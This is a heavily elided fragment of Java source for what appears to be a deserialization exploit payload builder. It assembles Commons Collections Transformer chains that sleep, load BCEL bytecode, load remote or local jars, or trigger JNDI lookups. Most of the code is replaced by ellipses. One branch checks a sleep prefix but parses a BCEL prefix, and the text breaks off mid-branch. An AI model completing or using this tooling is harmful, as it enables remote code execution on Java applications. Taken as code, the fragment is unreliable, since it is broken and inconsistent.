...
public class CommonsCollectionsUtil {
    public static Transformer[] getTransformerList(String command) throws Exception {
        ...
        if(command.toLowerCase().startsWith(COMMAND_SLEEP)){
            ...
            String bcelStr = command.substring(COMMAND_BCEL.length());
            transformers = new Transformer[]{
            ...
            String bcelClass = command.substring(COMMAND_BCEL_CLASS_FILE.length());
        ...
        } else if(command.toLowerCase().startsWith(COMMAND_LOADJAR)){
            String tmp = command.substring(COMMAND_LOADJAR.length());
        ...
        } else if(command.toLowerCase().startsWith(COMMAND_LOADJAR_WITH_ARGS)) {
            String tmp = command.substring(COMMAND_LOADJAR_WITH_ARGS.length());
            String jarPath = tmp.split("\\|")[0];
            String className = tmp.split("\\|")[1];
        ...
        } else if(command.toLowerCase().startsWith(COMMAND_JNDI)){
